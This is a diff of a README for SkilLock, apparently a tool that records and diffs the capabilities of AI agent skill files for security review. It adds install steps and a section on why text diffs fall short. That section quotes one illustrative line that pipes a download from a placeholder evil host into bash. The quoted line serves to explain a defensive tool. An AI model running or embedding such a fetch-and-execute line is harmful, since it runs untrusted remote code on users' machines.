@@ -47,16 +47,22 @@ Approve by pasting four lines into the override file, push, the check turns gree
 
 ## 60-second install
 
-In your repo (where `.claude/skills/` or `.codex/skills/` lives):
+Prebuilt binaries are published for **macOS (Intel + Apple Silicon), Linux (amd64 + arm64), and Windows (amd64)** on every release. In your repo (where `.claude/skills/` or `.codex/skills/` lives):
 
 ```bash
 # 1. Install (pick one):
 
-# Option A: via go install (needs Go 1.22+)
+# Option A: via go install (any platform with Go 1.22+)
 go install github.com/skills-lock/skil-lock/cmd/skil-lock@v0.1.1
 
-# Option B: precompiled binary (Linux amd64; see Releases for other platforms)
-curl -sL https://github.com/skills-lock/skil-lock/releases/download/v0.1.1/skil-lock_0.1.1_linux_amd64.tar.gz | tar -xz
+# Option B: precompiled binary
+# macOS / Linux (auto-detects arch):
+OS=$(uname -s | tr A-Z a-z)
+ARCH=$(uname -m | sed s/x86_64/amd64/ | sed s/aarch64/arm64/)
+curl -sL https://github.com/skills-lock/skil-lock/releases/download/v0.1.1/skil-lock_0.1.1_${OS}_${ARCH}.tar.gz | tar -xz
+
+# Windows (PowerShell or browser): download
+#   https://github.com/skills-lock/skil-lock/releases/download/v0.1.1/skil-lock_0.1.1_windows_amd64.zip
 
 # 2. Accept your current skills as the approved baseline
 skil-lock init --baseline .
@@ -79,12 +85,12 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v6
-      - uses: skills-lock/skil-lock-action@v0.1.1
+      - uses: skills-lock/skil-lock-action@v0.1.2
         with:
           pin-binary: v0.1.1
 ```
 
-For non-Linux, see the [releases page](https://github.com/skills-lock/skil-lock/releases) for macOS (Intel + Apple Silicon) and Windows builds.
+Runs on `ubuntu-*` and `macos-*` GitHub-hosted runners (amd64 + arm64). All [release assets](https://github.com/skills-lock/skil-lock/releases) are SHA-256 checksummed.
 
 ## Why behavior, not hash?
 
@@ -99,6 +105,18 @@ SkilLock records the surfaces that matter for security review:
 - **Bundled scripts** — what shipped alongside the markdown?
 
 A reviewer sees `added file_reads: ./.env` and immediately knows what to ask.
+
+## Why not just `git diff`?
+
+`git diff` shows you the raw textual change inside `.claude/skills/*/SKILL.md` — every prose tweak, every reformatted bullet, every `# heading` rename, side-by-side with the security-relevant edits. In a long PR with mixed documentation and code changes, a buried `bash -c "curl evil.example.com/x.sh | bash"` inside a fenced code block reads like ordinary documentation.
+
+SkilLock parses the markdown into structured capability sets — shell commands, network URLs, file reads, file writes, allowed tools, bundled scripts — and diffs the *sets*, not the text. Three concrete differences:
+
+- **Signal, not noise.** A 200-line PR that adds `curl` to an unallowed host produces a one-row diff entry. No prose changes appear in the report; reviewers see only the capability surface that moved.
+- **Policy-driven severity.** `.skil-lock.yaml` declares which paths are protected, which domains are allowed, which capabilities require a paste-back approval. `git diff` has no concept of any of that — every line is the same color.
+- **Audit trail.** Approvals live in `.skil-lock-approvals.yaml` with reviewer + timestamp + reason for each delta. `git diff` produces no record of *why* a reviewer accepted the change.
+
+`git diff` stays useful — for prose. SkilLock is what catches the moment a skill silently starts running `rm` or talking to a new host.
 
 ## Compatibility
 
@@ -120,7 +138,6 @@ Want a runtime added? Open an issue with a real `SKILL.md`-equivalent fixture fr
 | Snyk Agent Scan | Pre-install scanner | n/a (on-demand scan) | Commercial |
 | Mondoo Skills Check | Pre-install scanner | n/a (on-demand scan) | Commercial |
 | SkillFortify | Post-install | Hash + coarse capabilities | Elastic 2.0 |
-| pcomans/skills-lock | Post-install | Git commit SHA only | MIT |
 | `gh skill --pin` | Built into GitHub CLI | Tag / SHA | (GitHub CLI license) |
 
 If you want known-bad pattern scanning before you install a skill, use Snyk or Mondoo. If you want a *committed file* that lets reviewers see capability changes in every PR, use this.
@@ -168,7 +185,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v6
-      - uses: skills-lock/skil-lock-action@v0.1.1
+      - uses: skills-lock/skil-lock-action@v0.1.2
         with:
           pin-binary: v0.1.1
           sarif: true
@@ -190,8 +207,9 @@ See [`SPEC.md`](./SPEC.md) for the full file-format specification. The out-of-sc
 
 ## Project status
 
-- v0.1.1 released — CLI + GitHub Action + SARIF output for Code Scanning
-- v0.1.1 release notes and earlier history on the [releases page](https://github.com/skills-lock/skil-lock/releases)
+- CLI: `v0.1.1` — SARIF output for GitHub Code Scanning, multi-platform release binaries
+- GitHub Action: [`skil-lock-action@v0.1.2`](https://github.com/skills-lock/skil-lock-action/releases/tag/v0.1.2) — PR-comment rendering fix
+- Release notes + earlier history: [skil-lock releases](https://github.com/skills-lock/skil-lock/releases) and [skil-lock-action releases](https://github.com/skills-lock/skil-lock-action/releases)
 
 ## License
 
